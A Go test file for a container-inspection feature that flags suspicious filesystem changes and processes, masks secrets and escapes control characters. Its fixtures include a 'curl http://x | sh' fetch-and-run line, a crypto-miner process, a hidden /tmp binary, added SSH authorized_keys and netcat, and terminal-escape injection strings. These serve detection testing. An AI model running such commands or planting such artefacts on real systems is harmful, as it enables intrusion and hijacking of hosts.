package inspect

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/vantezzen/launchroom/daemon/internal/build"
	"github.com/vantezzen/launchroom/daemon/internal/docker"
	"github.com/vantezzen/launchroom/daemon/internal/secret"
	"github.com/vantezzen/launchroom/daemon/internal/state"
)

// dashC builds ps lines of shells running inline code (a constant, so
// TestNoShellInvocations sees no shell call in these fixtures).
const dashC = "-c"

const (
	wl      = state.WorkloadID("wl_01J9Z8X7W6V5T4S3R2Q1P0N9N7")
	ctrID   = "1111111111111111111111111111111111111111111111111111111111111111"
	imageID = "sha256:2222222222222222222222222222222222222222222222222222222222222222"
)

type fakeDocker struct {
	containers []docker.Container
	changes    []docker.Change
	top        docker.Processes
	stats      map[string]docker.PathStat
	statCalls  int
	images     map[string]string
	topErr     error
}

func (f *fakeDocker) ListContainers(_ context.Context, labels map[string]string) ([]docker.Container, error) {
	var out []docker.Container
	for _, c := range f.containers {
		if c.Labels[docker.LabelWorkload] == labels[docker.LabelWorkload] {
			out = append(out, c)
		}
	}
	return out, nil
}

func (f *fakeDocker) InspectContainer(_ context.Context, id string) (docker.Container, error) {
	for _, c := range f.containers {
		if c.ID == id {
			return c, nil
		}
	}
	return docker.Container{}, docker.ErrNotFound
}

func (f *fakeDocker) ContainerChanges(context.Context, string) ([]docker.Change, error) {
	return f.changes, nil
}

func (f *fakeDocker) ContainerTop(context.Context, string) (docker.Processes, error) {
	return f.top, f.topErr
}

func (f *fakeDocker) StatPath(_ context.Context, _, p string) (docker.PathStat, error) {
	f.statCalls++
	if st, ok := f.stats[p]; ok {
		return st, nil
	}
	return docker.PathStat{Mode: 0o644, Size: 10, Mtime: time.Date(2026, 10, 20, 0, 0, 0, 0, time.UTC)}, nil
}

func (f *fakeDocker) ImageID(_ context.Context, ref string) (string, error) {
	if id, ok := f.images[ref]; ok {
		return id, nil
	}
	return "", docker.ErrNotFound
}

func labels(extra map[string]string) map[string]string {
	l := map[string]string{docker.LabelManaged: "true", docker.LabelServer: "srv_x", docker.LabelWorkload: string(wl)}
	for k, v := range extra {
		l[k] = v
	}
	return l
}

var spec = state.WorkloadSpec{ID: wl, Image: "127.0.0.1:5000/apps/svc@sha256:4b5e57f6eb2f42b9039b3d1e13929295f231749c510cbe341cd68036d9af97e2"}

func options(d *fakeDocker, env map[string]secret.Secret) Options {
	return Options{
		Docker: d,
		Workload: func(id state.WorkloadID) *state.WorkloadSpec {
			if id == wl {
				return &spec
			}
			return nil
		},
		Env: func(*state.WorkloadSpec) (map[string]secret.Secret, error) { return env, nil },
		Now: func() time.Time { return time.Date(2026, 10, 25, 12, 0, 0, 0, time.UTC) },
	}
}

func running() docker.Container {
	return docker.Container{
		ID: ctrID, Name: "lr-wl_01j9z8x7w6v5t4s3r2q1p0n9n7", Labels: labels(nil), Running: true, ImageID: imageID,
		StartedAt: time.Date(2026, 10, 24, 9, 0, 0, 0, time.UTC), RestartCount: 2, WorkingDir: "/app", User: "node",
	}
}

func TestInspectClassifies(t *testing.T) {
	d := &fakeDocker{
		containers: []docker.Container{
			// A stopped duplicate never hides the running container; system and task containers are skipped.
			{ID: strings.Repeat("3", 64), Name: "lr-wl_old", Labels: labels(nil), Running: false},
			{ID: strings.Repeat("4", 64), Name: "lr-system-caddy", Labels: labels(map[string]string{docker.LabelSystem: "caddy"}), Running: true},
			{ID: strings.Repeat("5", 64), Name: "lr-run-x", Labels: labels(map[string]string{docker.LabelTask: "tsk_x"}), Running: true},
			running(),
		},
		images: map[string]string{string(spec.Image): imageID},
		changes: []docker.Change{
			{Path: "/tmp", Kind: docker.ChangeModified},
			{Path: "/tmp/.x", Kind: docker.ChangeAdded},
			{Path: "/tmp/.x/kworker", Kind: docker.ChangeAdded},
			{Path: "/app/server.js", Kind: docker.ChangeModified},
			{Path: "/app/.next/cache/images/a.webp", Kind: docker.ChangeAdded},
			{Path: "/app/.next/cache/images/b.webp", Kind: docker.ChangeAdded},
			{Path: "/root/.npm/_cacache/x", Kind: docker.ChangeAdded},
			{Path: "/home/node/.cache/y", Kind: docker.ChangeAdded},
			{Path: "/app/lib/__pycache__/m.pyc", Kind: docker.ChangeAdded},
			{Path: "/etc/passwd", Kind: docker.ChangeModified},
			{Path: "/etc/cron.d/job", Kind: docker.ChangeAdded},
			{Path: "/root/.ssh/authorized_keys", Kind: docker.ChangeAdded},
			{Path: "/usr/bin/nc", Kind: docker.ChangeAdded},
			{Path: "/var/log/app.log", Kind: docker.ChangeModified},
			{Path: "/run/nginx.pid", Kind: docker.ChangeAdded},
			{Path: "/srv/data.txt", Kind: docker.ChangeDeleted},
			{Path: "/opt/.hidden/thing", Kind: docker.ChangeAdded},
			{Path: "/opt/evil\x1b[31mname\\x", Kind: docker.ChangeAdded},
		},
		stats: map[string]docker.PathStat{
			"/tmp/.x/kworker": {Mode: 0o755, Size: 2_100_000, Mtime: time.Date(2026, 10, 22, 3, 0, 0, 0, time.UTC)},
			"/usr/bin/nc":     {Mode: 0o755, Size: 30_000},
		},
		top: docker.Processes{
			Titles: []string{"UID", "PID", "PPID", "C", "STIME", "TTY", "TIME", "CMD"},
			Processes: [][]string{
				{"node", "4100", "4000", "0", "09:00", "?", "00:00:01", "node server.js --db postgres://app:s3cretpw@db/app"},
				{"node", "4120", "4100", "0", "09:10", "?", "00:00:00", "/bin/sh " + dashC + " curl http://x | sh"},
				{"node", "4121", "4120", "0", "09:10", "?", "00:00:00", "curl http://203.0.113.5/x"},
				{"node", "4130", "4100", "0", "09:12", "?", "00:00:09", "/tmp/.x/kworker --donate-level 1"},
				{"root", "4140", "4100", "0", "09:13", "?", "00:00:00", "xmrig -o pool:3333"},
				{"node", "4150", "4100", "0", "09:14", "?", "00:00:00", "python3 -c import os"},
				{"node", "4160", "4100", "0", "09:15", "?", "00:00:00", "bash"},
				{"node", "4170", "4100", "0", "09:15", "?", "00:00:00", "printf \x1b]0;evil\x07 token=TOPSECRETVALUE"},
				{"node", "x", "4100", "0", "09:15", "?", "00:00:00", "bad pid"},
			},
		},
	}
	env := map[string]secret.Secret{"DATABASE_URL": secret.Secret("postgres://app:s3cretpw@db/app"), "API_TOKEN": secret.Secret("TOPSECRETVALUE")}
	res, err := Inspect(t.Context(), options(d, env), &state.InspectContainerSpec{Workload: wl, MaskEnv: []state.EnvName{"DATABASE_URL", "API_TOKEN", "MISSING"}})
	if err != nil {
		t.Fatal(err)
	}
	if res.ContainerID != ctrID || res.ImageID != imageID || !res.ImageMatches || res.RestartCount != 2 || res.User != "node" || res.WorkingDir != "/app" {
		t.Errorf("container facts: %+v", res)
	}

	// Collapsed caches.
	got := map[state.InspectedPath]int{}
	for _, c := range res.Changes.Collapsed {
		got[c.Prefix] = c.Count
	}
	want := map[state.InspectedPath]int{"/app/.next/cache": 2, "/root/.npm": 1, "/home/node/.cache": 1, "/app/lib/__pycache__": 1, "/var/log": 1, "/run": 1}
	if fmt.Sprint(got) != fmt.Sprint(want) {
		t.Errorf("collapsed = %v", got)
	}
	byPath := map[state.InspectedPath]state.ContainerChange{}
	for _, e := range res.Changes.Entries {
		byPath[e.Path] = e
	}
	check := func(p state.InspectedPath, flags ...state.ChangeFlag) {
		t.Helper()
		e, ok := byPath[p]
		if !ok {
			t.Errorf("%s missing", p)
			return
		}
		if !slices.Equal(e.Flags, flags) {
			t.Errorf("%s flags = %v, want %v", p, e.Flags, flags)
		}
	}
	check("/tmp/.x/kworker", state.ChangeFlagExecutable, state.ChangeFlagTempDir, state.ChangeFlagHidden)
	check("/app/server.js", state.ChangeFlagAppCode)
	check("/etc/passwd", state.ChangeFlagSensitiveFile)
	check("/etc/cron.d/job", state.ChangeFlagSensitiveFile)
	check("/root/.ssh/authorized_keys", state.ChangeFlagSensitiveFile)
	check("/usr/bin/nc", state.ChangeFlagExecutable, state.ChangeFlagSystemPath)
	check("/opt/.hidden/thing", state.ChangeFlagHidden)
	check("/srv/data.txt")
	check(`/opt/evil\x1b[31mname\\x`)
	if e := byPath["/tmp/.x/kworker"]; !e.Executable || e.Size != 2_100_000 || e.Type != state.FileRegular || e.ModifiedAt == nil {
		t.Errorf("kworker stat: %+v", e)
	}
	if e := byPath["/srv/data.txt"]; e.Type != "" {
		t.Errorf("deleted path was stat'ed: %+v", e)
	}
	if e := byPath["/tmp/.x"]; e.Type != "" {
		t.Errorf("a directory of other changes was stat'ed: %+v", e)
	}
	// Order: concerning first, then other flags, then app code, then the rest.
	ranks := []int{}
	for _, e := range res.Changes.Entries {
		ranks = append(ranks, rank(e.Flags))
	}
	if !slices.IsSorted(ranks) || res.Changes.Entries[len(res.Changes.Entries)-1].Path != "/srv/data.txt" {
		t.Errorf("order: %v", res.Changes.Entries)
	}

	// Processes.
	procs := map[int]state.ContainerProcess{}
	for _, p := range res.Processes.Entries {
		procs[p.PID] = p
	}
	pf := func(pid int, flags ...state.ProcessFlag) {
		t.Helper()
		if !slices.Equal(procs[pid].Flags, flags) {
			t.Errorf("pid %d flags = %v, want %v", pid, procs[pid].Flags, flags)
		}
	}
	pf(4100, state.ProcessFlagEntry)
	pf(4120, state.ProcessFlagShell, state.ProcessFlagInlineCode)
	pf(4121, state.ProcessFlagNetworkTool)
	pf(4130, state.ProcessFlagTempExecutable, state.ProcessFlagAddedBinary)
	pf(4140, state.ProcessFlagMiner)
	pf(4150, state.ProcessFlagInlineCode)
	pf(4160, state.ProcessFlagShell)
	if res.Processes.Total != 8 || len(res.Processes.Entries) != 8 {
		t.Errorf("processes: %+v", res.Processes)
	}
	if c := procs[4100].Command; strings.Contains(c, "s3cretpw") || !strings.Contains(c, "***") {
		t.Errorf("not masked: %q", c)
	}
	if c := procs[4170].Command; strings.Contains(c, "TOPSECRETVALUE") || strings.ContainsAny(c, "\x1b\x07") || !strings.Contains(c, `\x1b]0;evil\x07`) {
		t.Errorf("command = %q", c)
	}

	// The result is a valid completion.
	done := state.TaskCompletion{TypeMeta: state.NewTypeMeta(state.KindTaskCompletion), Attempt: 1, Outcome: state.OutcomeSucceeded, ContainerInspection: res}
	if err := done.Validate(); err != nil {
		t.Fatalf("completion invalid: %v", err)
	}
	enc, _ := json.Marshal(done)
	if strings.Contains(string(enc), "s3cretpw") || strings.Contains(string(enc), "TOPSECRETVALUE") {
		t.Error("secret value in the completion")
	}
}

func TestInspectFailures(t *testing.T) {
	ctx := t.Context()
	// Not in the desired state.
	d := &fakeDocker{containers: []docker.Container{running()}}
	if _, err := Inspect(ctx, options(d, nil), &state.InspectContainerSpec{Workload: "wl_01J9Z8X7W6V5T4S3R2Q1P0N9N8"}); err == nil {
		t.Error("workload outside the desired state inspected")
	}
	// Only a stopped container.
	stopped := running()
	stopped.Running = false
	d = &fakeDocker{containers: []docker.Container{stopped}}
	if _, err := Inspect(ctx, options(d, nil), &state.InspectContainerSpec{Workload: wl}); !errors.Is(err, ErrNotRunning) {
		t.Errorf("stopped: %v", err)
	}
	// Only system or helper containers with the label.
	sys := running()
	sys.Name = "lr-system-ambassador"
	helper := running()
	helper.Labels = labels(map[string]string{docker.LabelHelper: "volume"})
	d = &fakeDocker{containers: []docker.Container{sys, helper}}
	if _, err := Inspect(ctx, options(d, nil), &state.InspectContainerSpec{Workload: wl}); err == nil || errors.Is(err, ErrNotRunning) {
		t.Errorf("system/helper container inspected: %v", err)
	}
	// The container stopped between changes and top.
	gone := running()
	d = &fakeDocker{containers: []docker.Container{gone}, topErr: errors.New("is not running")}
	d.containers[0].Running = true
	opts := options(d, nil)
	inner := d
	opts.Docker = &stopAfterList{fakeDocker: inner}
	if _, err := Inspect(ctx, opts, &state.InspectContainerSpec{Workload: wl}); !errors.Is(err, ErrNotRunning) {
		t.Errorf("stopped during inspection: %v", err)
	}
	// Another image than the NodeState's.
	d = &fakeDocker{containers: []docker.Container{running()}, images: map[string]string{string(spec.Image): "sha256:" + strings.Repeat("9", 64)}}
	res, err := Inspect(ctx, options(d, nil), &state.InspectContainerSpec{Workload: wl})
	if err != nil || res.ImageMatches {
		t.Errorf("image mismatch: %v %+v", err, res)
	}
}

// stopAfterList reports the container stopped on the second inspect.
type stopAfterList struct {
	*fakeDocker
	inspects int
}

func (s *stopAfterList) InspectContainer(ctx context.Context, id string) (docker.Container, error) {
	s.inspects++
	c, err := s.fakeDocker.InspectContainer(ctx, id)
	if s.inspects > 1 {
		c.Running = false
	}
	return c, err
}

func TestLimits(t *testing.T) {
	var changes []docker.Change
	for i := range 3000 {
		changes = append(changes, docker.Change{Path: fmt.Sprintf("/srv/f%04d", i), Kind: docker.ChangeAdded})
	}
	for i := range 80 {
		changes = append(changes, docker.Change{Path: fmt.Sprintf("/x%02d/.next/cache/a", i), Kind: docker.ChangeAdded})
	}
	var rows [][]string
	for i := range 300 {
		rows = append(rows, []string{"node", fmt.Sprint(100 + i), "1", "0", "", "?", "", strings.Repeat("a", 900)})
	}
	d := &fakeDocker{containers: []docker.Container{running()}, changes: changes, top: docker.Processes{Titles: []string{"UID", "PID", "PPID", "C", "STIME", "TTY", "TIME", "CMD"}, Processes: rows}}
	res, err := Inspect(t.Context(), options(d, nil), &state.InspectContainerSpec{Workload: wl})
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Changes.Entries) != state.MaxInspectionChanges || !res.Changes.Truncated || len(res.Changes.Collapsed) != state.MaxInspectionCollapsed || d.statCalls != state.MaxInspectionStats {
		t.Errorf("changes: %d entries, %d collapsed, %d stats, truncated %v", len(res.Changes.Entries), len(res.Changes.Collapsed), d.statCalls, res.Changes.Truncated)
	}
	if len(res.Processes.Entries) != state.MaxInspectionProcesses || !res.Processes.Truncated || res.Processes.Total != 300 || len(res.Processes.Entries[0].Command) != maxCommand {
		t.Errorf("processes: %d, truncated %v", len(res.Processes.Entries), res.Processes.Truncated)
	}
	done := state.TaskCompletion{TypeMeta: state.NewTypeMeta(state.KindTaskCompletion), Attempt: 1, Outcome: state.OutcomeSucceeded, ContainerInspection: res}
	if err := done.Validate(); err != nil {
		t.Fatal(err)
	}
}

func TestEscape(t *testing.T) {
	for in, want := range map[string]string{
		"/plain/path":     "/plain/path",
		"/a\x1bb":         `/a\x1bb`,
		"/back\\slash":    `/back\\slash`,
		"/bad\xffutf8":    `/bad\xffutf8`,
		"/ünïcode":        "/ünïcode",
		"/c1\u009bx":      `/c1\xc2\x9bx`,
		"/del\x7f":        `/del\x7f`,
		"/tab\tnewline\n": `/tab\x09newline\x0a`,
	} {
		if got := Escape(in, 1024); got != want {
			t.Errorf("Escape(%q) = %q, want %q", in, got, want)
		}
	}
	if got := Escape(strings.Repeat("é", 600), 1024); len(got) != 1024 {
		t.Errorf("cut = %d bytes", len(got))
	}
	if got := Escape("/"+strings.Repeat("\x01", 300), 1024); len(got) > 1024 || strings.HasSuffix(got, `\x0`) {
		t.Errorf("cut mid-escape: %q", got[len(got)-8:])
	}
}

func TestCollapsePrefix(t *testing.T) {
	for in, want := range map[string]string{
		"/root/.npm/_cacache/x":     "/root/.npm",
		"/root/.npm":                "/root/.npm",
		"/home/app/.yarn/berry/x":   "/home/app/.yarn",
		"/root/.local/share/pnpm/s": "/root/.local/share/pnpm",
		"/srv/web/.next/cache/x":    "/srv/web/.next/cache",
		"/a/__pycache__/b/c.pyc":    "/a/__pycache__",
		"/var/lib/apt/lists/x":      "/var/lib/apt/lists",
		"/var/run/x.pid":            "/var/run",
		"/runner/x":                 "",
		"/home/.npm/x":              "",
		"/app/server.js":            "",
		"/var/cachex/y":             "",
	} {
		if got := collapsePrefix(in); got != want {
			t.Errorf("collapsePrefix(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestMaskValuesMatchRunOnce(t *testing.T) {
	m := build.NewMasker(maskValues(map[string]secret.Secret{"U": secret.Secret("https://user:hunter22@x.example/")}, []state.EnvName{"U"})...)
	if got := m.Mask("pw=hunter22 url=https://user:hunter22@x.example/"); strings.Contains(got, "hunter22") {
		t.Errorf("masked = %q", got)
	}
}

// busybox ps (no PPID column): only the first process is the entry; the
// result says parents are unknown instead of calling every process an entry.
func TestProcessesWithoutParents(t *testing.T) {
	top := docker.Processes{
		Titles: []string{"PID", "USER", "TIME", "COMMAND"},
		Processes: [][]string{
			{"4130", "root", "0:00", "sh " + dashC + " sleep 1234"},
			{"4100", "root", "0:00", "sleep 3600"},
			{"4131", "root", "0:00", "sleep 1234"},
		},
	}
	d := &fakeDocker{containers: []docker.Container{running()}, top: top}
	res, err := Inspect(t.Context(), options(d, nil), &state.InspectContainerSpec{Workload: wl})
	if err != nil {
		t.Fatal(err)
	}
	p := res.Processes
	if !p.ParentsUnknown || len(p.Entries) != 3 || p.Entries[0].PID != 4100 {
		t.Fatalf("processes = %+v", p)
	}
	if !slices.Equal(p.Entries[0].Flags, []state.ProcessFlag{state.ProcessFlagEntry}) || p.Entries[2].Flags != nil {
		t.Errorf("flags = %v / %v", p.Entries[0].Flags, p.Entries[2].Flags)
	}
	if !slices.Equal(p.Entries[1].Flags, []state.ProcessFlag{state.ProcessFlagShell, state.ProcessFlagInlineCode}) {
		t.Errorf("shell flags = %v", p.Entries[1].Flags)
	}
	for _, e := range p.Entries {
		if e.PPID != 0 {
			t.Errorf("ppid %d", e.PPID)
		}
	}
	done := state.TaskCompletion{TypeMeta: state.NewTypeMeta(state.KindTaskCompletion), Attempt: 1, Outcome: state.OutcomeSucceeded, ContainerInspection: res}
	if err := done.Validate(); err != nil {
		t.Fatal(err)
	}
	// With a PPID column the flag stays off.
	d.top = docker.Processes{Titles: []string{"UID", "PID", "PPID", "CMD"}, Processes: [][]string{{"root", "10", "1", "sleep 1"}}}
	if res, _ := Inspect(t.Context(), options(d, nil), &state.InspectContainerSpec{Workload: wl}); res.Processes.ParentsUnknown {
		t.Error("parents unknown with a PPID column")
	}
}

// A freshly started npm app as the dev stack's joint run saw it (docs/22
// §16.3): Docker's init mount, parent directories listed only because of
// their children, and npm's shell running the script are no findings. A shell
// started by the app itself still is.
func TestInspectFreshNpmContainer(t *testing.T) {
	c := running()
	c.Init = true
	d := &fakeDocker{
		containers: []docker.Container{c},
		images:     map[string]string{string(spec.Image): imageID},
		changes: []docker.Change{
			{Path: "/root", Kind: docker.ChangeModified},
			{Path: "/root/.npm", Kind: docker.ChangeAdded},
			{Path: "/root/.npm/_logs/debug-0.log", Kind: docker.ChangeAdded},
			{Path: "/tmp", Kind: docker.ChangeModified},
			{Path: "/tmp/node-compile-cache", Kind: docker.ChangeAdded},
			{Path: "/usr", Kind: docker.ChangeModified},
			{Path: "/usr/sbin", Kind: docker.ChangeModified},
			{Path: "/usr/sbin/docker-init", Kind: docker.ChangeAdded},
		},
		top: docker.Processes{
			Titles: []string{"UID", "PID", "PPID", "C", "STIME", "TTY", "TIME", "CMD"},
			Processes: [][]string{
				{"root", "5525", "5500", "0", "14:04", "?", "00:00:00", "/sbin/docker-init -- /bin/bash " + dashC + " npm run start"},
				{"root", "5562", "5525", "0", "14:04", "?", "00:00:01", "npm run start"},
				{"root", "5645", "5562", "0", "14:04", "?", "00:00:00", "sh " + dashC + " node server.js"},
				{"root", "5646", "5645", "0", "14:04", "?", "00:00:02", "node server.js"},
				{"root", "5700", "5646", "0", "14:30", "?", "00:00:00", "/bin/sh " + dashC + " id"},
				{"root", "5800", "5525", "0", "14:31", "?", "00:00:00", "node /usr/local/bin/pnpm start"},
				{"root", "5801", "5800", "0", "14:31", "?", "00:00:00", "sh " + dashC + " next start"},
			},
		},
	}
	res, err := Inspect(t.Context(), options(d, nil), &state.InspectContainerSpec{Workload: wl})
	if err != nil {
		t.Fatal(err)
	}
	var paths []state.InspectedPath
	for _, e := range res.Changes.Entries {
		paths = append(paths, e.Path)
	}
	if !slices.Equal(paths, []state.InspectedPath{"/tmp/node-compile-cache"}) || res.Changes.Total != 8 {
		t.Errorf("entries = %v (total %d)", paths, res.Changes.Total)
	}
	flags := map[int][]state.ProcessFlag{}
	for _, p := range res.Processes.Entries {
		flags[p.PID] = p.Flags
	}
	if len(flags[5645]) != 0 || len(flags[5801]) != 0 {
		t.Errorf("script shells flagged: %v %v", flags[5645], flags[5801])
	}
	if !slices.Equal(flags[5700], []state.ProcessFlag{state.ProcessFlagShell, state.ProcessFlagInlineCode}) {
		t.Errorf("app-spawned shell flags = %v", flags[5700])
	}

	// Without HostConfig.Init a docker-init file is the container's own.
	c.Init = false
	d.containers = []docker.Container{c}
	res, err = Inspect(t.Context(), options(d, nil), &state.InspectContainerSpec{Workload: wl})
	if err != nil {
		t.Fatal(err)
	}
	if !slices.ContainsFunc(res.Changes.Entries, func(e state.ContainerChange) bool { return e.Path == "/usr/sbin/docker-init" }) {
		t.Errorf("docker-init of a container without init dropped: %v", res.Changes.Entries)
	}
}
